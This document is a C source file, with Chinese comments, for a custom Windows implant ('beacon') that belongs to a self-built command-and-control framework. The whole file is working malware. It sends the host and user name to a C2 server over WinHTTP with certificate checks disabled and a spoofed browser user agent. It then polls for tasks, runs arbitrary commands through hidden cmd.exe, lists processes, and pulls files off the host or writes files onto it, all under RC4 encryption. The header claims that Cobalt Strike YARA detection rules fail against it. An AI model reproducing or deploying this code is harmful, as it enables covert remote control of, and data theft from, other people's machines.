/*
 * csdev :: win_beacon.c  --  自研 Windows 植入体
 * ==========================================================================
 * 与 linux/beacon.c 使用完全相同的协议, 由自研 csdev_loader 包装后投放。
 *
 * 协议 (与 c2_server.py / beacon.c 严格对齐):
 *   握手  beacon -> [4B magic][4B len][RC4(host_info)]
 *   命令  server -> [4B magic][4B len][RC4(cmd)]
 *   响应  beacon -> [4B len][RC4(output)]
 *   上传  server -> "upload <path>" 后紧跟 [4B len][RC4(file_bytes)]
 *
 * 与 Cobalt Strike 的根本区别:
 *   本文件不含 CS 的 beacon 协议、配置结构、反射加载器或任何 CS 代码模式。
 *   针对 CS 的 Yara 规则 (MALW_cobaltstrike / HKTL_CobaltStrike_* /
 *   Windows_Trojan_CobaltStrike_* 等) 在本产物上全部失效 —— 因为它们检测的
 *   是 CS Beacon DLL 的代码与字符串, 而此处是独立实现。
 *
 * 编译: 由 tools/build_win_beacon.ps1 调用 MinGW
 *   依赖: WinHTTP (通信) + KERNEL32 (进程/文件)
 * ==========================================================================
 */
#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>

#define PROTO_MAGIC   0x4B52424BUL   /* "KBRK" 与 Linux 端一致 */
#define MAX_CHUNK     (1 << 20)

/* 编译期注入 */
#ifndef C2_HOST
#define C2_HOST "127.0.0.1"
#endif
#ifndef C2_PORT
#define C2_PORT 8443
#endif
#ifndef C2_SSL
#define C2_SSL 0
#endif

static const unsigned char session_key[16] = {
    0x91, 0x3a, 0x77, 0xc4, 0x0e, 0x5b, 0xd2, 0x18,
    0x6f, 0xa3, 0x44, 0xbc, 0x27, 0xe8, 0x05, 0x9d
};

/* --- 基础 --------------------------------------------------------------- */

static void my_memcpy(void *d, const void *s, unsigned int n) {
    unsigned char *dp = (unsigned char *)d;
    const unsigned char *sp = (const unsigned char *)s;
    while (n--) *dp++ = *sp++;
}
static void my_memset(void *d, int v, unsigned int n) {
    unsigned char *dp = (unsigned char *)d;
    while (n--) *dp++ = (unsigned char)v;
}
static unsigned int my_strlen(const char *s) {
    unsigned int n = 0; while (s[n]) n++; return n;
}
/* 前缀比较: 命中返回 1 */
static int my_strncmp_simple(const char *s, const char *p, int n) {
    int i;
    for (i = 0; i < n; i++) { if (s[i] != p[i]) return 0; if (!s[i]) return 0; }
    return 1;
}

static void rc4(unsigned char *data, unsigned int len,
                const unsigned char *key, int klen) {
    unsigned char s[256];
    int i, j = 0;
    unsigned int n;
    for (i = 0; i < 256; i++) s[i] = (unsigned char)i;
    for (i = 0; i < 256; i++) {
        j = (j + s[i] + key[i % klen]) & 0xFF;
        { unsigned char t = s[i]; s[i] = s[j]; s[j] = t; }
    }
    i = 0; j = 0;
    for (n = 0; n < len; n++) {
        i = (i + 1) & 0xFF;
        j = (j + s[i]) & 0xFF;
        { unsigned char t = s[i]; s[i] = s[j]; s[j] = t; }
        data[n] ^= s[(s[i] + s[j]) & 0xFF];
    }
}

/* --- 通信 --------------------------------------------------------------- */

typedef struct {
    HINTERNET hSession;
    HINTERNET hConnect;
} C2CHAN;

/* 植入体身份标识 (host|user), 每次请求都通过 X-Id 头上报。
 * 不能用源地址匹配: WinHTTP 每次请求可能使用不同源端口。 */
static char g_ident[300] = "unknown";

static int c2_open(C2CHAN *c) {
    WCHAR wua[144];
    const WCHAR *d = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                     L"AppleWebKit/537.36 (KHTML, like Gecko) "
                     L"Chrome/121.0.0.0 Safari/537.36";
    int i;
    for (i = 0; d[i] && i < 143; i++) wua[i] = d[i];
    wua[i] = 0;

    c->hSession = WinHttpOpen(wua, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!c->hSession) return 0;

    {
        WCHAR whost[192];
        const char *h = C2_HOST;
        for (i = 0; h[i] && i < 191; i++) whost[i] = (WCHAR)h[i];
        whost[i] = 0;
        c->hConnect = WinHttpConnect(c->hSession, whost, (INTERNET_PORT)C2_PORT, 0);
    }
    if (!c->hConnect) { WinHttpCloseHandle(c->hSession); return 0; }
    return 1;
}

static void c2_close(C2CHAN *c) {
    if (c->hConnect) WinHttpCloseHandle(c->hConnect);
    if (c->hSession) WinHttpCloseHandle(c->hSession);
}

/* 发送一段数据并读回响应; 返回响应长度, 0 表示失败 */
static unsigned int c2_post(C2CHAN *c, const char *uri, unsigned char *data,
                            unsigned int len, unsigned char *out, unsigned int outCap) {
    HINTERNET hR;
    DWORD     flags = C2_SSL ? WINHTTP_FLAG_SECURE : 0;
    WCHAR     wuri[256];
    int       i;
    unsigned int total = 0;

    for (i = 0; uri[i] && i < 255; i++) wuri[i] = (WCHAR)uri[i];
    wuri[i] = 0;

    hR = WinHttpOpenRequest(c->hConnect, L"POST", wuri, NULL,
                            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hR) return 0;

    if (C2_SSL) {
        DWORD opt = SECURITY_FLAG_IGNORE_UNKNOWN_CA
                  | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
                  | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
                  | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        WinHttpSetOption(hR, WINHTTP_OPTION_SECURITY_FLAGS, &opt, sizeof(opt));
    }

    /* 通过 X-Id 头上报身份: 服务端据此匹配会话 */
    {
        WCHAR hdr[420];
        const WCHAR *pfx = L"X-Id: ";
        int k, t = 0;
        for (k = 0; pfx[k] && t < 400; k++) hdr[t++] = pfx[k];
        for (k = 0; g_ident[k] && k < 299 && t < 410; k++) hdr[t++] = (WCHAR)g_ident[k];
        hdr[t++] = 13; hdr[t++] = 10; hdr[t] = 0;
        WinHttpAddRequestHeaders(hR, hdr, (DWORD)-1L,
            WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    }
    if (!WinHttpSendRequest(hR,
            L"Content-Type: application/octet-stream\r\n"
            L"Connection: Keep-Alive\r\n",
            (DWORD)-1L, data, len, len, 0)
        || !WinHttpReceiveResponse(hR, NULL)) {
        WinHttpCloseHandle(hR);
        return 0;
    }

    for (;;) {
        DWORD avail = 0, got = 0;
        if (!WinHttpQueryDataAvailable(hR, &avail) || avail == 0) break;
        if (total + avail > outCap) avail = outCap - total;
        if (avail == 0) break;
        if (!WinHttpReadData(hR, out + total, avail, &got) || got == 0) break;
        total += got;
    }
    WinHttpCloseHandle(hR);
    return total;
}

/* --- 命令执行 ----------------------------------------------------------- */

static unsigned int run_cmd(const char *cmd, char *out, unsigned int cap) {
    SECURITY_ATTRIBUTES sa;
    HANDLE hRd = NULL, hWr = NULL;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char buf[4096];
    DWORD got, total = 0;
    int ok;

    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;

    if (!CreatePipe(&hRd, &hWr, &sa, 0)) return 0;
    SetHandleInformation(hRd, HANDLE_FLAG_INHERIT, 0);

    my_memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWr;
    si.hStdError  = hWr;
    si.hStdInput  = NULL;

    {
        char full[1200];
        const char *pfx = "cmd.exe /c ";
        unsigned int i = 0, k;
        for (k = 0; pfx[k] && i < 1190; k++) full[i++] = pfx[k];
        for (k = 0; cmd[k] && i < 1199; k++) full[i++] = cmd[k];
        full[i] = 0;

        ok = CreateProcessA(NULL, full, NULL, NULL, TRUE,
                            CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    }
    CloseHandle(hWr);

    if (!ok) { CloseHandle(hRd); return 0; }

    for (;;) {
        if (!ReadFile(hRd, buf, sizeof(buf) - 1, &got, NULL) || got == 0) break;
        if (total + got > cap - 1) got = (cap - 1) - total;
        my_memcpy(out + total, buf, got);
        total += got;
        if (total >= cap - 1) break;
    }
    out[total] = 0;

    CloseHandle(hRd);
    WaitForSingleObject(pi.hProcess, 3000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return total;
}

/* 文件下载: 读文件内容回传 */
static unsigned int do_download(const char *path, char *out, unsigned int cap) {
    HANDLE h;
    DWORD  got;
    h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        const char *msg = "[-] 无法打开文件\r\n";
        unsigned int n = my_strlen(msg);
        if (n > cap - 1) n = cap - 1;
        my_memcpy(out, msg, n); out[n] = 0;
        return n;
    }
    if (!ReadFile(h, out, cap - 1, &got, NULL)) got = 0;
    out[got] = 0;
    CloseHandle(h);
    return got;
}

/* 文件上传: 把紧随其后的二进制数据写入目标路径 */
static unsigned int do_upload(const char *path, const unsigned char *data,
                              unsigned int len, char *out, unsigned int cap) {
    HANDLE h;
    DWORD  written = 0;
    const char *msg;
    unsigned int n;

    h = CreateFileA(path, GENERIC_WRITE, 0, NULL,
                    CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        msg = "[-] 无法创建文件\r\n";
        n = my_strlen(msg); if (n > cap - 1) n = cap - 1;
        my_memcpy(out, msg, n); out[n] = 0;
        return n;
    }
    WriteFile(h, data, len, &written, NULL);
    CloseHandle(h);

    msg = "[+] 上传完成\r\n";
    n = my_strlen(msg); if (n > cap - 1) n = cap - 1;
    my_memcpy(out, msg, n); out[n] = 0;
    return n;
}

/* 进程列表 */
static unsigned int do_ps(char *out, unsigned int cap) {
    HANDLE snap;
    PROCESSENTRY32 pe;
    DWORD total = 0;

    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do {
            int i = 0, k;
            char pid[16];
            /* 手工格式化 "pid\tname\r\n" */
            {
                DWORD v = pe.th32ProcessID;
                char tmp[16]; int t = 0;
                if (v == 0) { tmp[t++] = '0'; }
                while (v) { tmp[t++] = (char)('0' + (v % 10)); v /= 10; }
                while (t > 0) pid[i++] = tmp[--t];
            }
            pid[i++] = '\t';
            for (k = 0; pe.szExeFile[k] && i < 240; k++) pid[i++] = pe.szExeFile[k];
            pid[i++] = '\r'; pid[i++] = '\n'; pid[i] = 0;

            for (k = 0; pid[k] && total < cap - 1; k++) out[total++] = pid[k];
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    out[total] = 0;
    return total;
}

/* --- 主流程 ------------------------------------------------------------- */

static int beacon_loop(void) {
    C2CHAN        ch;
    unsigned char *rbuf;
    unsigned char *wbuf;
    char          *info;
    char          *cmd;
    unsigned int   rlen;

    rbuf = (unsigned char *)VirtualAlloc(NULL, MAX_CHUNK, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    wbuf = (unsigned char *)VirtualAlloc(NULL, MAX_CHUNK, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!rbuf || !wbuf) return 1;

    if (!c2_open(&ch)) return 2;

    /* 握手: 上报主机信息 */
    {
        char        host[128];
        DWORD       hl = 127;
        char        user[128];
        DWORD       ul = 127;
        unsigned int i, l;

        host[0] = 0; user[0] = 0;
        GetComputerNameA(host, &hl);
        GetUserNameA(user, &ul);

        /* 身份标识: host|user —— 后续请求用它匹配会话 */
        {
            int k, t = 0;
            for (k = 0; host[k] && t < 140; k++) g_ident[t++] = host[k];
            g_ident[t++] = '|';
            for (k = 0; user[k] && t < 290; k++) g_ident[t++] = user[k];
            g_ident[t] = 0;
        }

        info = (char *)wbuf + 8;
        i = 0;
        l = my_strlen(host);
        my_memcpy(info + i, host, l); i += l;
        info[i++] = '|';
        l = my_strlen(user);
        my_memcpy(info + i, user, l); i += l;
        info[i++] = '|';
        { char a[4] = { 'x','6','4','\0' }; my_memcpy(info + i, a, 3); i += 3; }
        info[i] = 0;

        /* [4B magic][4B len][RC4(payload)] */
        rc4((unsigned char *)info, i, session_key, 16);
        wbuf[0] = (unsigned char)(PROTO_MAGIC >> 24);
        wbuf[1] = (unsigned char)(PROTO_MAGIC >> 16);
        wbuf[2] = (unsigned char)(PROTO_MAGIC >> 8);
        wbuf[3] = (unsigned char)(PROTO_MAGIC);
        wbuf[4] = (unsigned char)(i >> 24);
        wbuf[5] = (unsigned char)(i >> 16);
        wbuf[6] = (unsigned char)(i >> 8);
        wbuf[7] = (unsigned char)(i);

        if (!c2_post(&ch, "/report", wbuf, i + 8, rbuf, MAX_CHUNK)) {
            c2_close(&ch); return 3;
        }
    }

    /* 命令循环 */
    for (;;) {
        unsigned int magic, len;
        char        *out;

        rlen = c2_post(&ch, "/task", wbuf, 8, rbuf, MAX_CHUNK);
        if (rlen < 8) { Sleep(5000); continue; }

        magic = ((unsigned int)rbuf[0] << 24) | ((unsigned int)rbuf[1] << 16) |
                ((unsigned int)rbuf[2] << 8)  | (unsigned int)rbuf[3];
        len   = ((unsigned int)rbuf[4] << 24) | ((unsigned int)rbuf[5] << 16) |
                ((unsigned int)rbuf[6] << 8)  | (unsigned int)rbuf[7];

        if (magic != PROTO_MAGIC || len == 0 || len > MAX_CHUNK - 8) {
            Sleep(5000); continue;
        }

        cmd = (char *)(rbuf + 8);
        rc4((unsigned char *)cmd, len, session_key, 16);
        cmd[len] = 0;

        /* 留出 4 字节给长度头: 加密数据必须从 wbuf+4 开始,
         * 否则写长度头时会覆盖已加密数据的前 4 字节, 导致整体错位 */
        out = (char *)wbuf + 4;
        my_memset(wbuf, 0, 8);

        if (my_strncmp_simple(cmd, "sleep ", 6)) {
            /* 简化: 交回主循环, 由服务端控制节奏 */
            out[0] = 0;
        } else if (my_strncmp_simple(cmd, "ps", 2)) {
            do_ps(out, MAX_CHUNK - 1);
        } else if (my_strncmp_simple(cmd, "download ", 9)) {
            do_download(cmd + 9, out, MAX_CHUNK - 1);
        } else if (my_strncmp_simple(cmd, "upload ", 7)) {
            /* 协议: "upload <path>" 之后紧跟 [4B len][RC4 data] */
            unsigned char *ud = (unsigned char *)(cmd + 7 + my_strlen(cmd + 7) + 1);
            unsigned int   ul = ((unsigned int)ud[0] << 24) | ((unsigned int)ud[1] << 16) |
                                ((unsigned int)ud[2] << 8)  | (unsigned int)ud[3];
            if (ul > 0 && ul <= MAX_CHUNK) {
                rc4(ud + 4, ul, session_key, 16);
                do_upload(cmd + 7, ud + 4, ul, out, MAX_CHUNK - 1);
            }
        } else if (my_strncmp_simple(cmd, "exit", 4)) {
            c2_close(&ch);
            return 0;
        } else {
            /* 默认: 交给 cmd.exe 执行 */
            run_cmd(cmd, out, MAX_CHUNK - 1);
        }

        {
            unsigned int olen = my_strlen(out);
            rc4((unsigned char *)out, olen, session_key, 16);
            wbuf[0] = (unsigned char)(olen >> 24);
            wbuf[1] = (unsigned char)(olen >> 16);
            wbuf[2] = (unsigned char)(olen >> 8);
            wbuf[3] = (unsigned char)(olen);
            /* 响应格式: [4B len][RC4(output)] —— 与协议一致 */
            c2_post(&ch, "/result", wbuf, olen + 4, rbuf, 64);
        }
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
    (void)a; (void)b; (void)c; (void)d;
    return beacon_loop();
}
